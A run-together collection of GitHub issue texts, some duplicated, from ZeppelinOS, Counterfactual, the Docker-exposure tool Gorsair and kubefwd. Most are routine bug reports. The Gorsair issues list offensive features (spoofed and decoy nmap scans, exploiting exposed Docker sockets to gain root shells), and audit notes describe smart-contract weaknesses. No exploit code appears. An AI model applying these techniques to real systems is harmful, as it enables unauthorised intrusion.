
The following should be moved to the "entry guides" section (which doesn't exist yet):

- Building a GSN powered dapp
- Deploying to a public network

The following should be moved to the forum:

- Upgrades governance
- Onboarding ERC20 tokens Our integration tests are not satisfactory in catching several types of errors because they are not set up isolated, but sharing dependencies with the rest of the monorepo.

I think the correct way to set them up would be to use `npm pack` and store the `.tgz` as a build artifact, then pick it up from a different job and install it, which mirrors a real scenario much better. A bit of a challenge is to make it also work locally, although in that case it doesn't need to be as robust, as long as the CI catches errors later.

Because this is a monorepo with multiple packages, it might not be enough to use the `.tgz` since they depend on one another. What the web3.js project is doing is quite cool: they set up a private npm registry in the CI where they put all the package candidates, and the tests install from there. (https://github.com/ethereum/web3.js/pull/3157)  cli/src/utils/input.ts performs remix-like tests to parse incoming cli input and performs things such as:
- Wrap addresses and strings with quotes
- Expand scientific notation numbers to strings

Such parsing is tested in cli/test/src/utils/input.test.js, but they only test, IMHO, a few cases. They should be extended to be more exhaustive. When instructing a user to run `zos add contractName` on the documentation, clarify the format of contract name. It may be confusing whether the user must specify the name of the contract, or the filename that contains it (since it's similar to git). It is not easy to retrieve the address where a proxy instance has been deployed, in order to integrate it in a script or an app. Most tutorials out there rely on "writing it down" after running `zos create`, digging through the json file, or using a jq query to find it.

We should design and add a new command that, given a network and a contract name (and maybe an index as well?), returns the proxy address. Atm, if you have a contract such as 
```
contract Dummy {
  constructor(address adr) {} 
}
```
and you add it and then push it, you get a zos error:
"Contract Dummy has an explicit constructor. Change it to an initializer function."
which is fine, since logic contracts are not supposed to have constructors. We do this intentionally.

However, if for some reason the user wishes to do a `--force` push, the deployment of Dummy.sol fails with the error "Dummy contract constructor expected 1 arguments, received 0". This is because we don't pass any parameters to the constructor of a logic contract on deployment. The user will have no way to overcome this situation.

We could consider giving the user an option to pass parameters to the contract, or populate dummy parameters with something like:
```
  // Intended for Web3 v1
  private populateEmptyConstructorArgs(contractClass: Contract, args: any[]): any[] {
    const abi = contractClass._jsonInterface;
    const constructorABI = _.find(abi, (item) => item.type === 'constructor');
    // console.log(`constructor`, constructorABI);
    let populatedArgs = args;
    if(constructorABI && constructorABI.inputs.length !== args.length) {
      // console.log(`MISMATCH!`);
      // console.log(`args`, args);
      // TODO: do we know that the inputs are ordered in the same way that the args are?
      populatedArgs = _.zipWith(constructorABI.inputs, args, (input, arg) => {
        if(arg) return arg;
        if(input.type === 'address') return '0x0000000000000000000000000000000000000000';
        if(input.type === 'string') return '';
        if(input.type.startsWith('bytes')) return Buffer.from('');
        if(input.type.startsWith('uint')) return 0;
        if(input.type.startsWith('int')) return 0;
        if(input.type.startsWith('ufixed')) return 0;
        if(input.type.startsWith('fixed')) return 0;
        return [];
      });
      // console.log(`populated args`, populatedArgs);
    }
    return populatedArgs;
  }
```  First, thanks for an amazing project!

I have followed the instructions given here(https://docs.zeppelinos.org/docs/testing.html) to set up my project for testing with zos.

However, running `NODE_ENV=test npx truffle test` causes the following error:
<img width="732" alt="screen shot 2019-01-21 at 17 49 19" src="https://user-images.githubusercontent.com/19314578/51532903-49b3cc80-1e39-11e9-8a4f-32db64a2c7a7.png">

I'm using `node v10.15.0 (npm v6.6.0)` and my Truffle project (v5.0.0) dependencies are:
"zos": "^2.1.0",
"zos-lib": "^2.1.0"

test_file.js:
```
const zos = require('zos');
const ProofOfExistence = artifacts.require('../contracts/ProofOfExistence.sol');

contract('ProofOfExistence', (accounts) => {

....

  describe('ZOS upgradeability', () => {
    it('...should create a proxy', async function () {
      const project = await zos.TestHelper({ from: DEPLOYER_ADDRESS });
      const proxy = await project.createProxy(ProofOfExistence, { initMethod: 'initialize', initArgs: [BENEFICIARY_ADDRESS,PAUSER_ADDRESS], initFrom: DEPLOYER_ADDRESS});
      const result = await proxy.beneficiary();
      assert.equal(result, BENEFICIARY_ADDRESS, 'Returns incorrect beneficiary.');
    });
  });
});
```

Pointers in the right direction would be hugely appreciated! I tried to find if the issue is already exists or not, but it seems that there is no duplicates. 

Currently, I see that `zos-lib` contracts almost use `solidity v0.4.24`. It would be great if the solidity version can be migrated to [v0.5.x breaking changes](https://solidity.readthedocs.io/en/latest/050-breaking-changes.html). Since the migrations folder is not used in zos I would love to see it removed.

I have seen it there, assumed truffle is involved and attempted truffle migrate just to check that out only to then discover there is no migrations.sol present. Not a huge deal but it might save man-minutes** on the dev-end.

Is there a reason this should not be done? I faced this bug while playing with the `cli` today. 
A tipical scenario where this could happen is the following: 
- Create a new directory, `cd` it and ran `oz init`. 
- Notice yo forgot to run a `npm init` (or sth else), and terminate the `oz init` using `Ctrl+C`.
- Try to run again `oz init`. It will fail.

I would expect that the `.openzeppelin` folder won't be created if I terminate the `oz init` for some reason.
  In this PR https://github.com/zeppelinos/zos/pull/567, a few fixes were made to input.ts (remix-style parsing of input), and it was discussed that we could choose one of two safer approaches for a future iteration:

1. Be much more strict, and require everything to be properly enclosed in quotes (ie be valid JSON). This is more painful when accepting user input, but is a lot safer.
2. Generating a parser from a full grammar to handle the input, which should be safer and accommodate for more cases, but is also a lot more of work.

The current approach is not dangerous per-se, but uses non trivial regexes to parse all the input at once. There could be cases or situations that we are not accounting for. Contract.ts declares the Contract interface, which is an extension of the Web3 Contract type. Since @types/web3 types Web3 Contract as a class, the current implementation re-writes the declaration as an interface, since Typescript cannot have an interface extend a class.

This could be problematic when web3 changes, since we would have to manually re-sync the Contract interface.

The solution to this issue might imply a change in ZeppelinOS, in Web3, or both. Currently, a for a global ZOS installation, calling` zos session ......` creates a zos.json file in whatever direction you call the command. Oversight leads to lots of hanging zos.json files around. Would be nice if the command only worked if you called from the top level of a ZOS project directly. Which is the only place it is actually effective, as the other ZOS commands seem to be directory-dependent.   The guide should discuss things like the truffle config file, infura, hdwallet provider, automatic gas and gasPrice calculation, etc.
<---------->
143227440
From Decenter audit:

File name: ​MixinRespondToChallenge.sol
(lines 73-82): ​respondToChallenge() function
In case a user misses the chance to win and later in the game figures out which move cost him the game and could have instead been a winning one, they can create a challenge with the old state. Having returned the game back to that move, they can then apply the winning action and eventually claim victory over their opponent.
We believe it would be good to allow the second user to challenge this game result altering challenge by sending the previously recorded (non-winning) move from the first user. Currently, we have ~1Gb of `node_modules` dependencies on the monorepo, and most of that comes from the `devDependencies` of the Stencil Apps (namely `dapp-high-roller` and `playground`).

Considering that High Roller, Tic-Tac-Toe and their respective bot apps are demo environments for showcasing what Counterfactual is capable of, it makes sense to move them to a monorepo of their own, given the fact that they are not, strictly speaking, components of the framework.

We'd create a `demo-apps` monorepo, containing the following packages:

- `dapp-high-roller`
- `dapp-tic-tac-toe`
- `high-roller-bot`
- `tic-tac-toe-bot`

In order to accomplish this extraction, we need to meet the following high-level requirements:

- [ ] Create the new monorepo, with the same rules as `counterfactual/monorepo`
- [ ] Move the packages to the monorepo
- [ ] Fix `@counterfactual/*` dependencies, as they'll need to be pulled from the public registry instead of the monorepo
- [ ] Run the apps, make sure everything is working as it was before
- [ ] Migrate the CI jobs that involve those packages
- [ ] Reconfigure related deployments to be linked to `counterfactual/demo-apps`. For example, if the Hub API fails to create a user due to the username already being used, it'll show that error message correctly, but the button remains disabled while showing a spinner and no label at all.

The expected behavior is for the button to return to its enabled state and its previous label while hiding the spinner. We would like to be able to register middleware functions into specific protocols (i.e. before signing). We are wrapping an entire "transfer" transaction into a single call which installs a virtual app, updates the state, then uninstalls. In our testing, this was taking up to 10 seconds, which is not acceptable for UX. We need to find a way to bring this time down. From Decenter Audit:

File name:​ ​SingleAssetTwoPartyCoinTransferInterpreter.sol ​(lines 42-43)​;
In the current configuration, in case a user is using a contract as their “to” address for coin transfer and they lose the game, but have still won some small amount of ether, they can keep reverting the transaction.
Effectively, this first user could make the other party unable to withdraw their funds.
Our recommended solution is to use .send instead of transfer, as done in MultiAssetMultiPartyCoinTransferInterpreter Some of the `data-test-selector` values are too generic, like `button`. The idea of the test selector is to identify semantically what's the element we're selecting. I'd expect the "Create account" button to be referenced as `create-account-button`, for example. Similar to what was introduced in the Playground by #320, the user needs to be capable of adding more funds or withdrawing them from their CF account.

When you click the "Balance" information box located at the header, the user will be faced with two forms:

![image](https://user-images.githubusercontent.com/118913/61640573-f26da800-ac73-11e9-92ed-71597246d6e3.png)

The left one has the same features as the _Deposit_ flow that we've already implemented in #1732.

The right one is the inverse operation of a _deposit_: it's called _Withdraw_.

- It shows the Counterfactual account balance as "Available balance".
- The maximum amount you can withdraw is that of the CF account balance.
- The minimum amount you can withdraw is 0.1 ETH.
- The operation must be handled by a `withdraw` action in the Wallet store module. We have a bunch of `ifs` to return the proper error message according to each HTML5 validity state.  Since the `validity` hashmap is non-enumerable, we probably want to rebuild it with an object map of our own, hold the error messages there and do some pattern matching to avoid having a long if-chain there. The apps package in the NPM registry does not contain the EthUnidirectionalTransferApp in build artifacts. Can we deploy a new version that contains this? The contract and migrations are in master already so I'm not sure why it isn't deploying automatically. We are calling create channel like this:

```ts
const createChannelResponse = (await this.node.router.dispatch(
  jsonRpcDeserialize({
    id: Date.now(),
    jsonrpc: "2.0",
    method: NodeTypes.RpcMethodName.CREATE_CHANNEL,
    params: { owners: [this.node.publicIdentifier, counterpartyPublicIdentifier] },
  }),
)) as JsonRpcResponse;
const createChannelResult = createChannelResponse.result as NodeTypes.CreateChannelResult;
```

According to types, this should return us a `multisigAddress`:

```ts
type CreateChannelResult = {
    multisigAddress: string;
    owners: string[];
    counterpartyXpub: string;
};
```

The printed response does not contain the `multisigAddress` (nor any of the params specified).:

```
createChannelResult: {
  "transactionHash": "0x3d478a1481b1722d201c03a0647b05e9acb77a30d3bb0e1a41be7e03a480a120"
}
```

Because of this, we have to make a separate call to `GET_STATE_DEPOSIT_HOLDER_ADDRESS` to get the multisig address. https://medium.com/loopring-protocol/an-incompatibility-in-smart-contract-threatening-dapp-ecosystem-72b8ca5db4da

Some of our customers are using vulnerable contracts as seen in the above article. Anytime we use `ERC20.transfer` we can use the patched version instead in order to support token contracts that have this vulnerability.

https://github.com/sec-bit/badERC20Fix/blob/master/badERC20Fix.sol TSLint is being deprecated in favor of ESLint: https://github.com/typescript-eslint/typescript-eslint#what-about-tslint.

We should move to using ESLint instead. Running the following from a fresh clone errors out

```
yarn && yarn build && yarn test && cd packages/node && yarn test
```

with the following

```
invalid hexidecimal string (arg="value", value="0x0x608060405234801561001057600080fd5b506040516020806101a88339810180604052602081101561003057600080fd5b8101908080519060200190929190505050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156100c7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806101846024913960400191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050606e806101166000396000f3fe608060405273ffffffffffffffffffffffffffffffffffffffff600054163660008037600080366000845af43d6000803e6000811415603d573d6000fd5b3d6000f3fea165627a7a72305820694407262d1bf8a12b96a9ab0006c182bd726d829087da293c23bcb1e4bd03930029496e76616c6964206d617374657220636f707920616464726573732070726f7669646564", version=4.0.27)
``` Support `MULTI_ASSET_MULTI_PARTY_COIN_TRANSFER` outcome type for the `SimpleSwapApp` There is an error with this repository's Renovate configuration that needs to be fixed. As a precaution, Renovate will stop PRs until it is resolved.

File: `renovate.json`
Error type: The renovate configuration file contains some invalid settings
Message: `One or more configured baseBranches are missing from this repo: next`
 There is an error with this repository's Renovate configuration that needs to be fixed. As a precaution, Renovate will stop PRs until it is resolved.

File: `renovate.json`
Error type: The renovate configuration file contains some invalid settings
Message: `One or more configured baseBranches are missing from this repo: next`
 Support `MULTI_ASSET_MULTI_PARTY_COIN_TRANSFER` outcome type for the `SimpleSwapApp` Right now, we get an error when we query free balance for a token that does not have any: `Error: No free balance exists for the specified token: 0xdDA6327139485221633A1FcD65f4aC932E60A2e1`

Instead of an error that we have to catch on the caller side, it would be more beneficial to display a zero balance. What do you think? Once #1953 is resolved, we're gonna iterate to support selecting what kind of asset the user is depositing or withdrawing.

This also affects the Deposit screen for the onboarding flow, previously developed in #1732.
<---------->
143321747
Dependabot couldn't parse the go.mod found at `/go.mod`.

The error Dependabot encountered was:

```
go: github.com/spf13/viper@v1.6.1 requires
	github.com/grpc-ecosystem/grpc-gateway@v1.9.0 requires
	gopkg.in/yaml.v2@v2.0.0-20170812160011-eb3733d160e7: invalid version: git fetch -f origin refs/heads/*:refs/heads/* refs/tags/*:refs/tags/* in /opt/go/gopath/pkg/mod/cache/vcs/748bced43cf7672b862fbc52430e98581510f4f2c34fb30c0064b7102a68ae2c: exit status 128:
	fatal: The remote end hung up unexpectedly
```

[View the update logs](https://app.dependabot.com/accounts/Ullaakut/update-logs/17932155). Dependabot couldn't parse the go.mod found at `/go.mod`.

The error Dependabot encountered was:

```
go: github.com/spf13/viper@v1.6.1 requires
	github.com/grpc-ecosystem/grpc-gateway@v1.9.0 requires
	gopkg.in/yaml.v2@v2.0.0-20170812160011-eb3733d160e7: invalid version: git fetch -f origin refs/heads/*:refs/heads/* refs/tags/*:refs/tags/* in /opt/go/gopath/pkg/mod/cache/vcs/748bced43cf7672b862fbc52430e98581510f4f2c34fb30c0064b7102a68ae2c: exit status 128:
	fatal: The remote end hung up unexpectedly
```

[View the update logs](https://app.dependabot.com/accounts/Ullaakut/update-logs/17932155). - [ ] Add option for idle scanning through a zombie host
- [x] Add option for passing a proxy during nmap scan
- [x] Add option for IP spoofing
- [x] Add option for MAC spoofing
- [x] Add option for cloaking scan using decoys
- [x] Add option to specify network interface Vulnerable docker API found:
Endpoint address:	xx.xxxx.xxxx.xxxx
Endpoint API port:	2376
Docker version:	UNKNOWN
Docker API was unreachable:	Get http://xxxx.xxx.xxx.xxxx:2376/v1.39/info: net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x15\x03\x01\x00\x02\x02".
* Are you trying to connect to a TLS-enabled daemon without TLS?

Any setting to remediate this? I saw in this article need to set the environment to enable TLS for client 
https://tech.paulcz.net/blog/secure-docker-with-tls/ Currently, the user is given commands to run themselves. It would be better to:

- [ ] Exploit the docker socket using the docker library in order to gather more precise information on the system (what is available through `docker info`, `docker ps -a` and `docker images` for example.)
- [ ] Attempt to gain root access for the user and open an interactive terminal on the container within `gorsair` - [ ] Add option for idle scanning through a zombie host
- [ ] Add option for passing a proxy during nmap scan
- [ ] Add option for IP spoofing
- [ ] Add option for MAC spoofing
- [ ] Add option for cloaking scan using decoys
- [ ] Add option to specify network interface Integrating Disgo will make the code clearer. After I run:
`curl https://github.com/Ullaakut/Gorsair/releases/download/1.1.0/gorsair_linux_amd64 --output /usr/local/bin/gorsair`

and  `chmod 777 /usr/local/bin/gorsair`.


I run `gorsair` and I get an error:  
```
/usr/local/bin/gorsair: line 1: syntax error near unexpected token `<'
/usr/local/bin/gorsair: line 1: `<html><body>You are being <a href="https://github-production-release-asset-2e65be.s3.amazonaws.com/143321747/f74b3900-2d70-11e9-8129-9506787cd596?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20190214%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20190214T143347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=0783c1cf5b49ae9ce92c677a923efa3f613060f1d9e67719f35d4e5801a33c4f&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;response-content-disposition=attachment%3B%20filename%3Dgorsair_linux_amd64&amp;response-content-type=application%2Foctet-stream">redirected</a>.</body></html>'
```  

It seems that the command you mentioned on the main page doesn't download the file correctly. Integrating [Disgo](https://github.com/Ullaakut/disgo) will make the code clearer. After I run:
`curl https://github.com/Ullaakut/Gorsair/releases/download/1.1.0/gorsair_linux_amd64 --output /usr/local/bin/gorsair`

and  `chmod 777 /usr/local/bin/gorsair`.


I run `gorsair` and I get an error:  
```
/usr/local/bin/gorsair: line 1: syntax error near unexpected token `<'
/usr/local/bin/gorsair: line 1: `<html><body>You are being <a href="https://github-production-release-asset-2e65be.s3.amazonaws.com/143321747/f74b3900-2d70-11e9-8129-9506787cd596?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20190214%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20190214T143347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=0783c1cf5b49ae9ce92c677a923efa3f613060f1d9e67719f35d4e5801a33c4f&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;response-content-disposition=attachment%3B%20filename%3Dgorsair_linux_amd64&amp;response-content-type=application%2Foctet-stream">redirected</a>.</body></html>'
```  

It seems that the command you mentioned on the main page doesn't download the file correctly. Vulnerable docker API found:
Endpoint address:	xx.xxxx.xxxx.xxxx
Endpoint API port:	2376
Docker version:	UNKNOWN
Docker API was unreachable:	Get http://xxxx.xxx.xxx.xxxx:2376/v1.39/info: net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x15\x03\x01\x00\x02\x02".
* Are you trying to connect to a TLS-enabled daemon without TLS?

Any setting to remediate this? I saw in this article need to set the environment to enable TLS for client 
https://tech.paulcz.net/blog/secure-docker-with-tls/ - [ ] Add travisCI config file
- [ ] Add this repo in enabled travis repositories
- [ ] Hopefully TravisCI has a go version that supports go modules Hello,

When I run "go install" I'm receiving the following error.

can't load package: package github.com/Ullaakut/Gorsair: unknown import path "github.com/Ullaakut/Gorsair": cannot find module providing package github.com/Ullaakut/Gorsair
 Hello,

When I run "go install" I'm receiving the following error.

can't load package: package github.com/Ullaakut/Gorsair: unknown import path "github.com/Ullaakut/Gorsair": cannot find module providing package github.com/Ullaakut/Gorsair
 Currently, the user is given commands to run themselves. It would be better to:

- [x] Exploit the docker socket using the docker library in order to gather more precise information on the system (what is available through `docker info`, `docker ps -a` and `docker images` for example.)
- [x] Attempt to gain root access for the user and open an interactive terminal on the container within `gorsair` - [ ] Add Dockerfile
- [ ] Upload to DockerHub
- [ ] Add DockerHub build hook
<---------->
143650971
Hello,

I am trying to setup local port forwarding to a Kubernetes Cluster. I am behind a proxy. Is there a way to allow communication over a proxy. Here are the log details;

--------
kforward
2018/12/24 15:39:24  _          _           __             _
2018/12/24 15:39:24 | | ___   _| |__   ___ / _|_      ____| |
2018/12/24 15:39:24 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2018/12/24 15:39:24 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2018/12/24 15:39:24 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2018/12/24 15:39:24 
2018/12/24 15:39:24 Version 1.4.10
2018/12/24 15:39:24 https://github.com/txn2/kubefwd
2018/12/24 15:39:24 
2018/12/24 15:39:24 Press [Ctrl-C] to stop forwarding.
2018/12/24 15:39:24 'cat /etc/hosts' to see all host entries.
2018/12/24 15:39:24 Loaded hosts file /etc/hosts
2018/12/24 15:39:24 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2018/12/24 15:39:24 Error forwarding service: Get https://gav-cu-ine-dev-aks-91bc5af0.hcp.centralus.azmk8s.io:443/api/v1/namespaces/default/services: dial tcp: lookup gav-cu-ine-dev-aks-91bc5af0.hcp.centralus.azmk8s.io on 10.220.220.220:53: no such host
2018/12/24 15:39:24 Done...
------

Thanks
Sohil
Senior Staff Software Engineer, GE Aviation I can't seem to get kubefwd working with multiple selectors.  Here is my output

```
➜  kube git:(master) ✗ sudo kubefwd svc -n default -l ms=emailer,ms=account
Password:
2019/02/13 12:58:34  _          _           __             _
2019/02/13 12:58:34 | | ___   _| |__   ___ / _|_      ____| |
2019/02/13 12:58:34 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/13 12:58:34 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/13 12:58:34 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/13 12:58:34
2019/02/13 12:58:34 Version 1.4.10
2019/02/13 12:58:34 https://github.com/txn2/kubefwd
2019/02/13 12:58:34
2019/02/13 12:58:34 Press [Ctrl-C] to stop forwarding.
2019/02/13 12:58:34 'cat /etc/hosts' to see all host entries.
2019/02/13 12:58:34 Loaded hosts file /etc/hosts
2019/02/13 12:58:34 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2019/02/13 12:58:34 Done...
➜  kube git:(master) ✗
```

using a single selector works great

```
➜  kube git:(master) ✗ sudo kubefwd svc -n default -l ms=emailer
2019/02/13 12:59:46  _          _           __             _
2019/02/13 12:59:46 | | ___   _| |__   ___ / _|_      ____| |
2019/02/13 12:59:46 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/13 12:59:46 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/13 12:59:46 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/13 12:59:46
2019/02/13 12:59:46 Version 1.4.10
2019/02/13 12:59:46 https://github.com/txn2/kubefwd
2019/02/13 12:59:46
2019/02/13 12:59:46 Press [Ctrl-C] to stop forwarding.
2019/02/13 12:59:46 'cat /etc/hosts' to see all host entries.
2019/02/13 12:59:46 Loaded hosts file /etc/hosts
2019/02/13 12:59:46 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2019/02/13 12:59:46 Forwarding: emailer:3001 to pod emailer-7f975c9855-5lnl2:3001
2019/02/13 12:59:46 Forwarding: emailer:80 to pod emailer-7f975c9855-5lnl2:8080
```
Any thoughts? First of all, thanks for `kubefwd`! This project is exactly what I've been looking for.

I'm testing out `kubefwd` and I'm including _all_ of the services in my cluster (~80 services). I've noticed that whenever I stop `kubefwd` (`Ctrl+c`), there are number of `/etc/hosts` entries that do not get removed. It seems to be inconsistent which entries are left behind and how many there are.

One of the entries is for `::1 localhost.localdomain` which causes `kubefwd` to fail to start. I read through https://github.com/txn2/kubefwd/issues/23 which states that `1.4.10` attempts to correct this issue. Let me know if I should open a separate issue for this.

```
$ kubefwd version
2019/01/17 12:29:33 Version 1.4.10
```
`/etc/hosts` file after stopping `kubefwd`:
```
$ cat /etc/hosts
127.0.0.1 localhost localhost.localdomain
127.0.1.1 host host.localdomain
127.1.27.25 serviceA
127.1.27.51 serviceB.default serviceB.default.svc.cluster.local
127.1.27.73 serviceC.defaultserviceC.default.svc.cluster.local
127.1.27.75 serviceD.default
127.1.27.77 serviceE
::1 localhost.localdomain localhost.localdomain localhost.localdomain
```

 I have been using kubefwd just find for the last few weeks.  Now all of the sudden when I launch it, the app says its changing the hosts fine then stops the app.  Here is the output from my console.

```PS>kubefwd svc -n monitoring
2019/02/07 11:56:12  _          _           __             _
2019/02/07 11:56:12 | | ___   _| |__   ___ / _|_      ____| |
2019/02/07 11:56:12 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/07 11:56:12 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/07 11:56:12 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/07 11:56:12
2019/02/07 11:56:12 Version 1.4.10
2019/02/07 11:56:12 https://github.com/txn2/kubefwd
2019/02/07 11:56:12
2019/02/07 11:56:12 Press [Ctrl-C] to stop forwarding.
2019/02/07 11:56:12 'cat /etc/hosts' to see all host entries.
2019/02/07 11:56:12 Loaded hosts file C:\Windows\System32\drivers\etc\hosts
2019/02/07 11:56:12 Hostfile management: Original hosts backup already exists at C:\Windows\System32\drivers\etc\hosts.o
riginal
2019/02/07 11:56:12 Done...```

Any ideas? I have been using kubefwd just find for the last few weeks.  Now all of the sudden when I launch it, the app says its changing the hosts fine then stops the app.  Here is the output from my console.

```PS>kubefwd svc -n monitoring
2019/02/07 11:56:12  _          _           __             _
2019/02/07 11:56:12 | | ___   _| |__   ___ / _|_      ____| |
2019/02/07 11:56:12 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/07 11:56:12 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/07 11:56:12 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/07 11:56:12
2019/02/07 11:56:12 Version 1.4.10
2019/02/07 11:56:12 https://github.com/txn2/kubefwd
2019/02/07 11:56:12
2019/02/07 11:56:12 Press [Ctrl-C] to stop forwarding.
2019/02/07 11:56:12 'cat /etc/hosts' to see all host entries.
2019/02/07 11:56:12 Loaded hosts file C:\Windows\System32\drivers\etc\hosts
2019/02/07 11:56:12 Hostfile management: Original hosts backup already exists at C:\Windows\System32\drivers\etc\hosts.o
riginal
2019/02/07 11:56:12 Done...```

Any ideas? I can't seem to get kubefwd working with multiple selectors.  Here is my output

```
➜  kube git:(master) ✗ sudo kubefwd svc -n default -l ms=emailer,ms=account
Password:
2019/02/13 12:58:34  _          _           __             _
2019/02/13 12:58:34 | | ___   _| |__   ___ / _|_      ____| |
2019/02/13 12:58:34 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/13 12:58:34 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/13 12:58:34 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/13 12:58:34
2019/02/13 12:58:34 Version 1.4.10
2019/02/13 12:58:34 https://github.com/txn2/kubefwd
2019/02/13 12:58:34
2019/02/13 12:58:34 Press [Ctrl-C] to stop forwarding.
2019/02/13 12:58:34 'cat /etc/hosts' to see all host entries.
2019/02/13 12:58:34 Loaded hosts file /etc/hosts
2019/02/13 12:58:34 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2019/02/13 12:58:34 Done...
➜  kube git:(master) ✗
```

using a single selector works great

```
➜  kube git:(master) ✗ sudo kubefwd svc -n default -l ms=emailer
2019/02/13 12:59:46  _          _           __             _
2019/02/13 12:59:46 | | ___   _| |__   ___ / _|_      ____| |
2019/02/13 12:59:46 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/13 12:59:46 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/13 12:59:46 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/13 12:59:46
2019/02/13 12:59:46 Version 1.4.10
2019/02/13 12:59:46 https://github.com/txn2/kubefwd
2019/02/13 12:59:46
2019/02/13 12:59:46 Press [Ctrl-C] to stop forwarding.
2019/02/13 12:59:46 'cat /etc/hosts' to see all host entries.
2019/02/13 12:59:46 Loaded hosts file /etc/hosts
2019/02/13 12:59:46 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2019/02/13 12:59:46 Forwarding: emailer:3001 to pod emailer-7f975c9855-5lnl2:3001
2019/02/13 12:59:46 Forwarding: emailer:80 to pod emailer-7f975c9855-5lnl2:8080
```
Any thoughts? When there are completed pods (which belongs to a job), kubefwd exits as follows:

$ sudo kubefwd svc --namespace default
2019/01/07 15:30:50  _          _           __             _
2019/01/07 15:30:50 | | ___   _| |__   ___ / _|_      ____| |
2019/01/07 15:30:50 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/01/07 15:30:50 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/01/07 15:30:50 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/01/07 15:30:50
2019/01/07 15:30:50 Version 1.4.10
2019/01/07 15:30:50 https://github.com/txn2/kubefwd
2019/01/07 15:30:50
2019/01/07 15:30:50 Press [Ctrl-C] to stop forwarding.
2019/01/07 15:30:50 'cat /etc/hosts' to see all host entries.
2019/01/07 15:30:50 Loaded hosts file /etc/hosts
2019/01/07 15:30:50 Hostfile management: Original hosts backup already exists at /etc/hosts.original
2019/01/07 15:30:50 Forwarding: kubernetes:443 to pod my-job-p7sqj:443
2019/01/07 15:30:51 ERROR: error upgrading connection: unable to upgrade connection: pod not found ("my-job-p7sqj_default")
2019/01/07 15:30:51 Stopped forwarding kubernetes in default.
2019/01/07 15:30:51 Done..

$ kubectl get pods
NAME                                        READY     STATUS      RESTARTS   AGE
my-job-p7sqj                            0/1       Completed   0          11m

 Hello , 

We've been experiencing this issue quite often. 

Duplicate host entries get assigned randomly every time kubefwd is executed.

```sudo kubefwd svc -n some_namespace
Password:
2019/02/09 00:15:54  _          _           __             _
2019/02/09 00:15:54 | | ___   _| |__   ___ / _|_      ____| |
2019/02/09 00:15:54 | |/ / | | | '_ \ / _ \ |_\ \ /\ / / _  |
2019/02/09 00:15:54 |   <| |_| | |_) |  __/  _|\ V  V / (_| |
2019/02/09 00:15:54 |_|\_\\__,_|_.__/ \___|_|   \_/\_/ \__,_|
2019/02/09 00:15:54 
2019/02/09 00:15:54 Version 1.4.10
2019/02/09 00:15:54 https://github.com/txn2/kubefwd
2019/02/09 00:15:54 
2019/02/09 00:15:54 Press [Ctrl-C] to stop forwarding.
2019/02/09 00:15:54 'cat /etc/hosts' to see all host entries.
2019/02/09 00:15:54 Hosfile error: Duplicate hostname entry for some_entry -> some_ip
2019/02/09 00:15:54 Errors loading hostfile ``` To add local DNS lookup in `hosts` is convenient, kind of one original core idea of this great tool, but I wonder if that makes sense to support localhost with random ports, just like the usual way that Docker does to expose container ports using its `-P`.

With that, we don't have to modify `hosts`, create loopback alias, etc., hence do not need `sudo` any more. Just to give people another option, to make it more widely used. Does it make sense? Sometimes we need to interact with services in different namespaces for local development.  It'd be nice if `kubefwd` supports the ability to forward services from different namespaces other than the current one.

This could potentially make `kubefwd` forward too many services if there isn't a way to selectively forward services from other namespaces.  To remedy that, kubefwd could take a config file that specifies what services should be forwarded.

I wouldn't mind taking stab at implementing this feature if you think it's worthwhile.

Cheers,
 kubefwd doesn't respect merging configuration files with the KUBECONFIG env variable. 

For instance doing `KUBECONFIG=config:config2` will merge configs `config` and `config2` when doing a `kubectl config view`. 

